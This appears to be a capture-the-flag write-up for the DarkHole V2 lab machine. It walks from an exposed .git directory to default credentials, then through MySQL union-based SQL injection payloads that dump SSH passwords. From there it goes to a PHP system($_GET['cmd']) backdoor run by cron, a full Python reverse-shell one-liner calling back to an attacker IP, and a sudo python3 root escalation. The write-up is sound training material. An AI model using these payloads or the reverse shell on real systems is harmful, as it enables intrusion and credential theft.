
---
tags:
	#SQLi
	#git_leak
	#cron
---

## 1. Enumeration

### Nmap Scan
Starting with an Nmap scan to identify open ports and services.

```bash
nmap -sV -sC -Pn -p- 192.168.52.132

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: DarkHole V2
| http-git:
|   192.168.52.132:80/.git/
|     Git repository found!
|     Last commit message: i changed login.php file for more secure
```

### Git Information Leakage
The Nmap scan revealed a `.git` directory. I explored the git logs to find sensitive information.

```bash
# Checking git logs
git log

commit 0f1d821f48a9cf662f285457a5ce9af6b9feb2c4 (HEAD -> master)
Author: Jehad Alqurashi <anmar-v7@hotmail.com>
Date:   Mon Aug 30 13:14:32 2021 +0300
    i changed login.php file for more secure

commit a4d900a8d85e8938d3601f3cef113ee293028e10
Author: Jehad Alqurashi <anmar-v7@hotmail.com>
Date:   Mon Aug 30 13:06:20 2021 +0300
    I added login.php file with default credentials
```

By checking the diff of the second commit, I found the default credentials:

```bash
git log -p
...
-    if($_POST['email'] == "lush@admin.com" && $_POST['password'] == "321"){
...
```

**Credentials Found:** `lush@admin.com` / `321`

---

## 2. Web Exploitation (SQL Injection)

After logging in with the discovered credentials, I noticed a query parameter `id=1` in the dashboard URL.

### Identifying SQLi
Notice that in the end of URL, there is a query parameter `id=1`. I tested for SQL injection:
*   `'or+1=1+--` -> Returns status 500 (Syntax error).
*   `'or+1=1+--+` -> Returns status 200 OK. This confirms the vulnerability and suggests the backend is **MySQL** (due to the required space after the comment `--`).

### Data Extraction
I used **Burp Suite Intruder** with the payload `' order by $1$` to determine the number of columns. The application returned a 200 OK for up to 6 columns.

**Key SQL Components:**

1. **information_schema (The Metadata Database)**
   In MySQL, `information_schema` is a built-in database that acts as a "directory" for all other databases on the server. It contains metadata about the database structure.
   *   `information_schema.tables`: A table containing the names of every table in every database. We filter it using `WHERE table_schema = 'database_name'`.
   *   `information_schema.columns`: A table containing every column name. We filter it using `WHERE table_name = 'table_name'`.

2. **group_concat()**
   This is one of the most powerful functions in SQL injection.
   *   **Purpose**: By default, a `SELECT` statement returns multiple rows. However, most web pages only display the first row of a query result.
   *   **Function**: `group_concat()` takes all the results from multiple rows and "squashes" them into a single string (separated by commas by default). This allows us to see every table name or every username in the database in a single view.
   *   **Example**: `group_concat(user, ':', pass)` combines the user and password columns with a colon in between for every row in the table.

Using `UNION SELECT` to extract information (using `id=-1` to ensure the injected data is displayed in the original result's place):

1.  **Extract Database Info:**
    *   **Payload:** `-1'union+select+1,database(),version(),4,user(),6--+`
    *   **Results:**
        *   **Database Name:** `dakrhole_2`
        *   **Version:** `8.0.26-0ubuntu0.20.04.2`
        *   **User:** `root@localhost`

2.  **Enumerate Tables:**
    *   **Payload:** `-1'+union+select+1,group_concat(table_name),3,4,5,6+from+information_schema.tables+where+table_schema='darkhole_2'--+`
    *   **Tables Found:** `users`, `ssh`

3.  **Enumerate Columns in 'ssh' Table:**
    *   **Payload:** `-1'+union+select+1,group_concat(column_name),3,4,5,6+from+information_schema.columns+where+table_name='ssh'--+`
    *   **Columns Found:** `id`, `user`, `pass`

4.  **Extract SSH Credentials:**
    *   **Payload:** `-1'+union+select+1,group_concat(user,':',pass),3,4,5,6+from+ssh--+`
    *   **Credentials:** `jehad:fool`

**Discovered Credentials:** `jehad` / `fool`

---

## 3. Initial Access (SSH)

Using the credentials found via SQLi, I logged in via SSH:

```bash
ssh jehad@192.168.52.132
# Password: fool
```

---

## 4. Privilege Escalation (User: losy)

Checking the system for internal services and cronjobs:

```bash
jehad@darkhole:~$ cat /etc/crontab
...
* * * * * losy  cd /opt/web && php -S localhost:9999
```

### The `php -S` Command
The command `php -S localhost:9999` starts the **PHP Built-in Web Server**.
*   **Purpose:** It is designed for development and testing, allowing developers to run PHP applications locally without the overhead of a full web server like Apache or Nginx.
*   **Security Risk:** It is not intended for production use. It lacks advanced security features and, in this case, was configured to run as the user `losy`.
*   **Exploitation:** Because the server is running as `losy`, any code executed through it (like the command injection vulnerability in `index.php`) will run with `losy`'s permissions, effectively providing a path for horizontal privilege escalation from `jehad`.

Checking the source code at `/opt/web/index.php`:

```php
<?php
echo "Parameter GET['cmd']";
if(isset($_GET['cmd'])){
    echo system($_GET['cmd']);
}
?>
```

### Vulnerability Analysis: Command Injection
The `index.php` file is a direct entry point for **Remote Code Execution (RCE)** due to a critical command injection vulnerability:
1.  **User-Controlled Input:** The script accepts input directly from the `cmd` parameter in the URL's query string (`$_GET['cmd']`).
2.  **Dangerous Function:** It passes this raw, unsanitized input into the PHP `system()` function.
3.  **Command Execution:** The `system()` function executes the provided string as a shell command on the host operating system.
4.  **Result:** By injecting a shell command (like a reverse shell payload) into the `cmd` parameter, we can force the server to execute our code.

### Remote Code Execution (RCE)
This script is vulnerable to command injection. I used `curl` to execute a reverse shell:

```bash
curl "http://localhost:9999/index.php?cmd=python3+-c+'import+socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.52.128\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
```

### Explaining the Reverse Shell Payload
The Python command executed via `curl` creates a reverse shell back to my machine:
0.  **`python3 -c '...'`**: The `-c` flag tells Python to execute the following string as a command. This allows us to run a multi-line script as a single-line shell command.
1.  **`import socket,os,pty`**: Imports the required modules for networking (`socket`), OS interaction (`os`), and pseudo-terminal management (`pty`).
2.  **`s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)`**: Creates a new TCP socket using IPv4.
3.  **`s.connect(("192.168.52.128",4444))`**: Establishes a connection to the attacker's machine (`192.168.52.128`) on port `4444`.
4.  **`os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)`**: Redirects standard input (`0`), standard output (`1`), and standard error (`2`) to the socket. This means anything sent from the attacker's machine is treated as input for the server's shell, and all output is sent back to the attacker.
5.  **`pty.spawn("/bin/bash")`**: Spawns an interactive bash shell. Using `pty.spawn` instead of `os.system` provides a more stable and interactive shell environment.

I caught the shell as `losy`.

---

## 5. Privilege Escalation (User: root)

Checking `losy`'s home directory for clues:

```bash
losy@darkhole:~$ cat .bash_history
P0assw0rd losy:gang
...
sudo -l
sudo python3 -c 'import os; os.system("/bin/sh")'
```

The history reveals the password `gang` and a hint for privilege escalation.

### Sudo Privileges
Checking sudo permissions for `losy`:

```bash
losy@darkhole:~$ sudo -l
Matching Defaults entries for losy on darkhole:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User losy may run the following commands on darkhole:
    (ALL : ALL) ALL
    (root) /usr/bin/python3
```

Since `losy` can run `python3` as root, I executed a root shell:

```bash
losy@darkhole:~$ sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
root@darkhole:/# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Additional Concepts

### Git Exposure
Exposing the `.git` directory on a production web server is a critical vulnerability. It allows attackers to download the entire source code history, which often contains sensitive information like hardcoded credentials, API keys, or previous versions of code with known vulnerabilities. Tools like `git-dumper` can be used to reconstruct the repository.

### Local Port Forwarding / Internal Services
Sometimes services are configured to listen only on `localhost` (127.0.0.1) for security. However, if an attacker gains initial access as a low-privileged user, they can interact with these internal services. In this case, the PHP development server running as `losy` provided a path for horizontal privilege escalation.

### SQL Injection (Error-Based vs. Union-Based)
In this challenge, we used Union-Based SQLi, which leverages the `UNION` operator to combine the results of the original query with a new query crafted by the attacker. This is effective when the application displays the results of the query directly on the page.